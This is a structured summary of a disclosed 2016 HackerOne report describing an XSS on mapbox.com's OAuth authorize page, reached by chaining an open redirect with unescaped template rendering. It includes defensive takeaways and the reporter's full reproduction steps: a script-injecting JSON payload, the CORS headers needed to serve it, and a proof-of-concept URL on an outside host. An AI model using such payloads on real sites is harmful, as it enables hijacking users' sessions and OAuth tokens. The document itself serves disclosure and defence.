# XSS on mapbox.com/authorize/ via Open Redirect and Unsafe Template Rendering

## Metadata
- **Source:** HackerOne
- **Report:** 143240 | https://hackerone.com/reports/143240
- **Submitted:** 2016-06-05
- **Reporter:** stefanovettorazzi
- **Program:** Mapbox
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), Open Redirect, Unsafe Template Rendering, Improper Input Validation
- **CVEs:** None
- **Category:** web-api

## Summary
An open redirect vulnerability in /core/oauth/auth combined with unsafe template rendering allows attackers to redirect users to attacker-controlled HTTPS endpoints and inject arbitrary JavaScript code. The vulnerable code fails to escape the 'authorize_url' property before inserting it into an HTML form action attribute, enabling XSS attacks in the user's browser.

## Attack scenario
1. Attacker identifies that /core/oauth/auth accepts a redirect_uri parameter and returns JSON without proper validation
2. Attacker sets up an HTTPS server serving malicious JSON with XSS payload in the authorize_url field and appropriate CORS headers
3. Attacker crafts a URL pointing to mapbox.com/authorize/ with redirect_uri parameter pointing to their malicious server
4. Victim clicks the link or is redirected to the mapbox.com/authorize/ endpoint
5. The page fetches content from attacker's server via the open redirect parameter
6. Unsanitized JSON response is rendered in template, executing injected JavaScript in victim's browser with access to mapbox.com origin

## Root cause
Two chained vulnerabilities: (1) Open redirect - /core/oauth/auth redirects to any URL passed in redirect_uri parameter without validation, (2) Unsafe template rendering - the authorize_url property from the JSON response is directly interpolated into HTML without escaping, allowing breaking out of the form action attribute and injecting script tags

## Attacker mindset
An attacker would recognize the chain of trust being broken: a legitimate domain (mapbox.com) fetches and renders content from an attacker-controlled domain without sanitization. By controlling both the redirect target and the JSON response, the attacker can achieve XSS while maintaining the mapbox.com origin, bypassing same-origin restrictions and gaining access to user tokens/credentials.

## Defensive takeaways
- Always whitelist allowed redirect URIs rather than accepting arbitrary user-supplied values
- Implement strict output encoding/escaping for all user-controlled data before inserting into HTML templates, especially in attribute contexts
- Use templating engines with auto-escaping enabled by default
- Validate and sanitize JSON responses from external/redirected sources before rendering
- Implement Content Security Policy (CSP) to restrict inline script execution
- Use security headers to prevent open redirects (validate redirect targets against allowlist)
- Never trust data from redirected responses without re-validation

## Variant hunting
Search for similar patterns: (1) Other OAuth/authentication endpoints accepting redirect_uri parameters, (2) Template rendering with unescaped properties from external JSON sources, (3) CORS-enabled endpoints returning JSON that gets rendered client-side, (4) Form action attributes populated from API responses, (5) Other Mapbox endpoints using similar oauth/auth pattern with different parameters

## MITRE ATT&CK
- T1190
- T1598.003
- T1566.002

## Notes
The vulnerability is particularly severe because it affects the OAuth authorization flow, potentially allowing attackers to steal authorization tokens. The requirement for HTTPS for the malicious server and CORS headers shows attacker sophistication but is not a significant barrier. The report includes a working PoC URL demonstrating real-world exploitation. This is a classic example of chaining multiple moderate issues (open redirect + XSS) into a critical attack.

## Full report
<details><summary>Expand</summary>

Description
---
When you load the endpoint https://www.mapbox.com/authorize/ a GET request is made to the endpoint https://www.mapbox.com/core/oauth/auth with the parameters passed in the request to https://www.mapbox.com/authorize/. 
If you only send the parameter __redirect_uri__ in the request to https://www.mapbox.com/core/oauth/auth, the response from the server is a 302 redirect to the value passed in the parameter __redirect_uri__.
If the response from the latest request (after the redirect) is valid like:
```json
{
  "authorize_url": "/authrozie/...",
  "stage": "authorize",
  "user": {
    "name": "some-name",
    "extraTm2z": 1
  },
  "origin": ""
}
```
the content is used to render the template __template-modal-oauth__ in https://www.mapbox.com/authorize/.

The problem is that the value of the property `"authorize_url"` is not escaped when passed to the template
```html
<form id='oauth' method='post' action='<%=App.api + obj.authorize_url%>' class='col6 modal-body fill-white'>
...
```
which allows to break the `<form>` using `'>` and insert HTML and Javascript code.

Reproduction steps
---
1. Create a file with this content in a server that supports __https://__

      ```json
      {
        "authorize_url": "'><script>alert(document.domain);</script>",
        "stage": "authorize",
        "user": {
          "name": "nombre",
          "extraTm2z": 1
       },
       "origin": ""
     }
     ```

2. Set these headers to be returned in the response when serving the file (I don't specify how because it varies from server to server and language)

      ```
      Access-Control-Allow-Origin: https://www.mapbox.com
      Access-Control-Allow-Credentials: true
      Access-Control-Allow-Headers: x-requested-with
      ```

3. Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge

      ```
      https://www.mapbox.com/authorize/?redirect_uri=[url_to_file_created_in_step_1]
      ```

4. `alert(document.domain)` is executed

Proof of concept
---
Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge
```
https://www.mapbox.com/authorize/?redirect_uri=https://u00f1.xyz/mapbox/oauth.json
```

I'm going to do a screen recording and upload it.

</details>

---
*Analysed by Claude on 2026-05-12*
